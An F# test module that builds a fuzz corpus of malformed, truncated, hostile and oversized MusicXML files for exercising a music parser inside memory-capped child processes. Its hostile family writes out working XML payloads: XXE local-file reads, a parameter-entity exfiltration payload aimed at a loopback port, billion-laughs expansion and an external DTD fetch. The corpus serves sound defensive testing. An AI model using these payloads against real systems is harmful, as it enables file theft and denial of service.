// SPDX-License-Identifier: Apache-2.0
// Copyright (c) Andrew J. Willshire / ToolUp Analytics Ltd (UK)

/// Phase 687 — the native-parser fuzz corpus: hostile MusicXML the
/// toolkit must refuse or accept WITHOUT faulting. Generated
/// deterministically here rather than committed as files, so every case
/// is readable as the intent that produced it and the corpus cannot drift
/// from its description.
///
/// Four families:
///   * malformed   — not XML, not MusicXML, or MusicXML with the wrong shape,
///                   plus fixed-seed byte mutations of a valid score;
///   * truncated   — a valid score cut at every tenth of its length;
///   * hostile     — entity attacks (XXE, billion laughs, external DTD), deep
///                   nesting, oversized names and attributes, control bytes,
///                   invalid UTF-8, numeric overflow candidates;
///   * oversized   — thousands of measures, a text run of megabytes.
///
/// **Where a case runs, and why that is not negotiable.** Every case is
/// handed to the parser INSIDE THE ISOLATION SEAM'S OUT-OF-PROCESS WORKER
/// (`ProcessIsolation`), one fresh child per case, under a kernel-enforced
/// memory cap and a wall-clock bound. The first draft of this corpus ran
/// in-process in the toolkit's own test runner on the theory that the
/// Expecto process could be the sacrificial one: one case grew that
/// process to **126 GB** and, Windows having no OOM killer, took the
/// operator's whole machine down — four times over one night. That is
/// why the sacrificial process is now a CAPPED child and never the
/// runner.
///
/// **Which case, measured — because the first attribution was wrong.**
/// The incident was recorded as the `billion-laughs-entity-expansion`
/// case, on the strength of the name. Run through capped children the
/// entity cases — billion laughs, both XXE shapes, the external DTD —
/// all ANSWER in ~0.1 s with a ~75 MB peak and leak nothing: libverovio
/// parses with pugixml, which does not expand DTD entities at all. The
/// case that grows without bound is `malformed/forward-past-end` —
/// `<forward><duration>2147483647</duration></forward>` — which reaches a
/// 512 MiB cap in 0.5 s and a 2 GiB cap in under 2 s, at roughly a
/// gigabyte a second, which is exactly the trajectory that fills a
/// machine in minutes. Two more findings from the same run:
/// `malformed/chord-with-no-first-note` is a native ACCESS VIOLATION
/// (0xC0000005) on both load paths, and
/// `oversized/5000-notes-in-one-measure` does not answer inside 30 s.
/// See `FuzzTests.fs` for the outcome vocabulary (answered / contained /
/// crashed), its known-findings ledger, and the README beside it for the
/// run recipe.
module ToolUp.Companions.Fuzz.Tests.FuzzCorpus

open System
open System.IO
open System.Text

/// One corpus case: a name a report can cite, the family it belongs to,
/// and the bytes handed to the parser.
type FuzzCase = {
    Family: string
    Name: string
    Input: byte[]
}

/// A minimal but complete MusicXML partwise score: one part, two measures,
/// a few notes with a rest — enough structure that truncation and mutation
/// land inside real elements.
let validMusicXml =
    """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE score-partwise PUBLIC "-//Recordare//DTD MusicXML 4.0 Partwise//EN" "http://www.musicxml.org/dtds/partwise.dtd">
<score-partwise version="4.0">
  <work><work-title>Fuzz Corpus Baseline</work-title></work>
  <part-list>
    <score-part id="P1"><part-name>Music</part-name></score-part>
  </part-list>
  <part id="P1">
    <measure number="1">
      <attributes>
        <divisions>4</divisions>
        <key><fifths>0</fifths></key>
        <time><beats>4</beats><beat-type>4</beat-type></time>
        <clef><sign>G</sign><line>2</line></clef>
      </attributes>
      <note><pitch><step>C</step><octave>4</octave></pitch><duration>4</duration><type>quarter</type></note>
      <note><pitch><step>D</step><octave>4</octave></pitch><duration>4</duration><type>quarter</type></note>
      <note><pitch><step>E</step><octave>4</octave></pitch><duration>4</duration><type>quarter</type></note>
      <note><rest/><duration>4</duration><type>quarter</type></note>
    </measure>
    <measure number="2">
      <note><pitch><step>F</step><octave>4</octave></pitch><duration>8</duration><type>half</type></note>
      <note><pitch><step>G</step><octave>4</octave></pitch><duration>8</duration><type>half</type></note>
    </measure>
  </part>
</score-partwise>
"""

let private utf8 (text: string) = Encoding.UTF8.GetBytes text

let private case family name (input: byte[]) = {
    Family = family
    Name = name
    Input = input
}

/// Replace the notes of measure 2 with `body`, keeping the document
/// otherwise valid — the hook every structural mutation uses.
let private withMeasureTwo (body: string) =
    let marker = "<measure number=\"2\">"
    let start = validMusicXml.IndexOf marker + marker.Length
    let finish = validMusicXml.IndexOf("</measure>", start)
    validMusicXml.Substring(0, start) + body + validMusicXml.Substring finish

/// The valid score with `bytes` spliced in after the `<part-name>` tag.
let private splicedIntoPartName (bytes: byte[]) =
    let at = validMusicXml.IndexOf "<part-name>" + "<part-name>".Length

    Array.concat [
        utf8 (validMusicXml.Substring(0, at))
        bytes
        utf8 (validMusicXml.Substring at)
    ]

let private note (body: string) =
    "<note><pitch><step>A</step><octave>4</octave></pitch><duration>4</duration>"
    + body
    + "</note>"

// ─── Malformed ───────────────────────────────────────────────────────

let private malformed = [
    case "malformed" "not-xml-at-all" (utf8 "this is not a score, or XML, or anything")
    case "malformed" "binary-garbage" (Array.init 4096 (fun i -> byte ((i * 7919 + 13) % 251)))
    case "malformed" "png-header" [|
        0x89uy
        0x50uy
        0x4Euy
        0x47uy
        0x0Duy
        0x0Auy
        0x1Auy
        0x0Auy
        0uy
        0uy
        0uy
        13uy
    |]
    case "malformed" "empty-root" (utf8 "<score-partwise/>")
    case "malformed" "unclosed-root" (utf8 "<score-partwise version=\"4.0\"><part-list>")
    case "malformed" "mismatched-nesting" (utf8 "<score-partwise><part><measure></part></measure></score-partwise>")
    case "malformed" "wrong-root-element" (utf8 "<html><body><p>not music</p></body></html>")
    case "malformed" "mei-fed-as-musicxml" (utf8 "<mei xmlns=\"http://www.music-encoding.org/ns/mei\"><music/></mei>")
    case
        "malformed"
        "part-without-part-list"
        (utf8 "<score-partwise><part id=\"P9\"><measure number=\"1\"/></part></score-partwise>")
    case
        "malformed"
        "attributes-renamed-away"
        (utf8 (validMusicXml.Replace("<attributes>", "<x>").Replace("</attributes>", "</x>")))
    case
        "malformed"
        "note-without-pitch-or-rest"
        (utf8 (withMeasureTwo "<note><duration>4</duration><type>quarter</type></note>"))
    case
        "malformed"
        "note-without-duration"
        (utf8 (withMeasureTwo "<note><pitch><step>A</step><octave>4</octave></pitch><type>quarter</type></note>"))
    case
        "malformed"
        "backup-past-start"
        (utf8 (withMeasureTwo "<backup><duration>99999</duration></backup><note><rest/><duration>4</duration></note>"))
    case "malformed" "forward-past-end" (utf8 (withMeasureTwo "<forward><duration>2147483647</duration></forward>"))
    case
        "malformed"
        "chord-with-no-first-note"
        (utf8 (
            withMeasureTwo "<note><chord/><pitch><step>A</step><octave>4</octave></pitch><duration>4</duration></note>"
        ))
    case
        "malformed"
        "tuplet-stop-without-start"
        (utf8 (withMeasureTwo (note "<notations><tuplet type=\"stop\"/></notations>")))
    case
        "malformed"
        "tie-and-slur-dangling"
        (utf8 (
            withMeasureTwo (
                note
                    "<tie type=\"stop\"/><notations><slur type=\"stop\" number=\"7\"/><tied type=\"stop\"/></notations>"
            )
        ))
    case
        "malformed"
        "unknown-clef-and-key"
        (utf8 (
            validMusicXml
                .Replace("<sign>G</sign><line>2</line>", "<sign>Q</sign><line>-9</line>")
                .Replace("<fifths>0</fifths>", "<fifths>99</fifths>")
        ))
    case
        "malformed"
        "empty-step-and-octave"
        (utf8 (withMeasureTwo "<note><pitch><step></step><octave></octave></pitch><duration>4</duration></note>"))
    case "malformed" "processing-instruction-only" (utf8 "<?xml version=\"1.0\"?>")
    case "malformed" "only-doctype" (utf8 "<!DOCTYPE score-partwise>")
    case
        "malformed"
        "cdata-in-numbers"
        (utf8 (validMusicXml.Replace("<divisions>4</divisions>", "<divisions><![CDATA[4]]></divisions>")))
]

/// Deterministic byte mutations of the valid score: a fixed-seed PRNG
/// flips one to four bytes per variant, so the corpus is reproducible and
/// a report can name the variant that faulted.
let private mutations =
    let baseline = utf8 validMusicXml
    let random = Random 687

    [
        for variant in 1..40 do
            let bytes = Array.copy baseline
            let flips = 1 + variant % 4

            for _ in 1..flips do
                let at = random.Next bytes.Length
                bytes[at] <- byte (random.Next 256)

            case "malformed" $"byte-flip-variant-{variant:D2}" bytes
    ]

// ─── Truncated ───────────────────────────────────────────────────────

let private truncated =
    let baseline = utf8 validMusicXml

    [
        for tenth in 1..9 do
            let length = baseline.Length * tenth / 10
            case "truncated" $"cut-at-{tenth * 10}-percent" baseline[.. length - 1]
        case
            "truncated"
            "cut-inside-tag-name"
            (utf8 (validMusicXml.Substring(0, validMusicXml.IndexOf "<divisions>" + 5)))
        case
            "truncated"
            "cut-inside-attribute-value"
            (utf8 (validMusicXml.Substring(0, validMusicXml.IndexOf "number=\"1\"" + 8)))
        case "truncated" "single-byte" [| 0x3Cuy |]
        case "truncated" "zero-bytes" [||]
    ]

// ─── Hostile ─────────────────────────────────────────────────────────

/// The marker an external-entity resolution would leak into the parsed
/// document. `hostileEntityFilePath` is the file the XXE cases point at;
/// the test writes the marker there before running them and asserts the
/// exported MEI never contains it.
let leakMarker = "FUZZ-CORPUS-XXE-LEAK-8f3a1c"

/// The local file the XXE cases try to read.
let hostileEntityFilePath =
    Path.Combine(Path.GetTempPath(), "verovio-fuzz-corpus-xxe-target.txt")

let private hostile =
    let fileUri = Uri(hostileEntityFilePath).AbsoluteUri

    let minimalTail =
        "<part-list><score-part id=\"P1\"><part-name>x</part-name></score-part></part-list><part id=\"P1\"><measure number=\"1\"/></part></score-partwise>"

    let xxe =
        "<?xml version=\"1.0\"?><!DOCTYPE score-partwise [<!ENTITY xxe SYSTEM \""
        + fileUri
        + "\">]><score-partwise version=\"4.0\"><work><work-title>&xxe;</work-title></work><part-list><score-part id=\"P1\"><part-name>&xxe;</part-name></score-part></part-list><part id=\"P1\"><measure number=\"1\"><note><rest/><duration>4</duration></note></measure></part></score-partwise>"

    let parameterEntity =
        "<?xml version=\"1.0\"?><!DOCTYPE score-partwise [<!ENTITY % file SYSTEM \""
        + fileUri
        + "\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:9/?%file;'>\">%eval;%exfil;]><score-partwise version=\"4.0\">"
        + minimalTail

    let billionLaughs =
        "<?xml version=\"1.0\"?><!DOCTYPE score-partwise [<!ENTITY a \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"><!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\"><!ENTITY c \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\"><!ENTITY d \"&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;\"><!ENTITY e \"&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;\"><!ENTITY f \"&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;\"><!ENTITY g \"&f;&f;&f;&f;&f;&f;&f;&f;&f;&f;\"><!ENTITY h \"&g;&g;&g;&g;&g;&g;&g;&g;&g;&g;\">]><score-partwise version=\"4.0\"><work><work-title>&h;</work-title></work>"
        + minimalTail

    let externalDtd =
        "<?xml version=\"1.0\"?><!DOCTYPE score-partwise SYSTEM \"http://127.0.0.1:9/never-served.dtd\"><score-partwise version=\"4.0\">"
        + minimalTail

    let deepNesting depth =
        let builder = StringBuilder()

        builder.Append
            "<score-partwise version=\"4.0\"><part-list><score-part id=\"P1\"><part-name>x</part-name></score-part></part-list><part id=\"P1\"><measure number=\"1\">"
        |> ignore

        for _ in 1..depth do
            builder.Append "<direction>" |> ignore

        builder.Append "<direction-type><words>deep</words></direction-type>" |> ignore

        for _ in 1..depth do
            builder.Append "</direction>" |> ignore

        builder.Append "</measure></part></score-partwise>" |> ignore
        builder.ToString()

    let hugeAttribute =
        withMeasureTwo (
            note (
                "<notations><slur type=\"start\" number=\""
                + String('9', 100_000)
                + "\"/></notations>"
            )
        )

    [
        case "hostile" "xxe-external-general-entity" (utf8 xxe)
        case "hostile" "xxe-parameter-entity-exfiltration" (utf8 parameterEntity)
        case "hostile" "billion-laughs-entity-expansion" (utf8 billionLaughs)
        case "hostile" "external-dtd-fetch" (utf8 externalDtd)
        case "hostile" "nesting-depth-1000" (utf8 (deepNesting 1_000))
        case "hostile" "nesting-depth-50000" (utf8 (deepNesting 50_000))
        case "hostile" "attribute-of-100k-chars" (utf8 hugeAttribute)
        case "hostile" "element-name-of-64k-chars" (utf8 ("<" + String('a', 65_536) + "/>"))
        case "hostile" "nul-bytes-in-content" (splicedIntoPartName (Array.zeroCreate 64))
        case
            "hostile"
            "invalid-utf8-sequences"
            (splicedIntoPartName [|
                0xC0uy
                0xAFuy
                0xFFuy
                0xFEuy
                0xEDuy
                0xA0uy
                0x80uy
                0xF4uy
                0x90uy
                0x80uy
                0x80uy
            |])
        case "hostile" "utf16-with-bom" (Array.concat [ [| 0xFFuy; 0xFEuy |]; Encoding.Unicode.GetBytes validMusicXml ])
        case
            "hostile"
            "numeric-overflow-divisions"
            (utf8 (validMusicXml.Replace("<divisions>4</divisions>", "<divisions>2147483647</divisions>")))
        case
            "hostile"
            "numeric-overflow-duration"
            (utf8 (withMeasureTwo "<note><rest/><duration>18446744073709551616</duration></note>"))
        case
            "hostile"
            "negative-and-zero-numbers"
            (utf8 (
                validMusicXml
                    .Replace("<divisions>4</divisions>", "<divisions>0</divisions>")
                    .Replace("<octave>4</octave>", "<octave>-2147483648</octave>")
                    .Replace("<beats>4</beats>", "<beats>-1</beats>")
            ))
        case
            "hostile"
            "float-in-integer-fields"
            (utf8 (
                validMusicXml
                    .Replace("<divisions>4</divisions>", "<divisions>4.5e308</divisions>")
                    .Replace("<octave>4</octave>", "<octave>NaN</octave>")
            ))
        case
            "hostile"
            "thousands-of-parts-sharing-one-id"
            (utf8 (
                "<score-partwise version=\"4.0\"><part-list>"
                + String.replicate 2_000 "<score-part id=\"P\"><part-name>x</part-name></score-part>"
                + "</part-list>"
                + String.replicate 2_000 "<part id=\"P\"><measure number=\"1\"/></part>"
                + "</score-partwise>"
            ))
        case
            "hostile"
            "duplicate-measure-numbers"
            (utf8 (validMusicXml.Replace("<measure number=\"2\">", "<measure number=\"1\">")))
        case
            "hostile"
            "self-referencing-ids"
            (utf8 (
                withMeasureTwo (
                    "<note id=\"n1\"><pitch><step>A</step><octave>4</octave></pitch><duration>4</duration><notations><tied type=\"start\" number=\"n1\"/><tied type=\"stop\" number=\"n1\"/></notations></note>"
                )
            ))
    ]

// ─── Oversized ───────────────────────────────────────────────────────

let private oversized =
    let manyMeasures count =
        let builder = StringBuilder()

        builder.Append(validMusicXml.Substring(0, validMusicXml.IndexOf "<measure number=\"2\">"))
        |> ignore

        for n in 2..count do
            builder.Append
                $"<measure number=\"{n}\"><note><pitch><step>C</step><octave>5</octave></pitch><duration>16</duration><type>whole</type></note></measure>"
            |> ignore

        builder.Append "</part></score-partwise>" |> ignore
        builder.ToString()

    [
        case "oversized" "3000-measures" (utf8 (manyMeasures 3_000))
        case
            "oversized"
            "text-run-of-4-megabytes"
            (utf8 (validMusicXml.Replace("Fuzz Corpus Baseline", String('T', 4 * 1024 * 1024))))
        case
            "oversized"
            "5000-notes-in-one-measure"
            (utf8 (
                withMeasureTwo (
                    String.replicate
                        5_000
                        "<note><pitch><step>B</step><octave>3</octave></pitch><duration>1</duration><type>16th</type></note>"
                )
            ))
        case
            "oversized"
            "500-lyric-verses-on-one-note"
            (utf8 (
                withMeasureTwo (
                    note (String.concat "" [ for v in 1..500 -> $"<lyric number=\"{v}\"><text>la</text></lyric>" ])
                )
            ))
    ]

/// The whole corpus, in the order a report lists it.
let all: FuzzCase list =
    List.concat [ malformed; mutations; truncated; hostile; oversized ]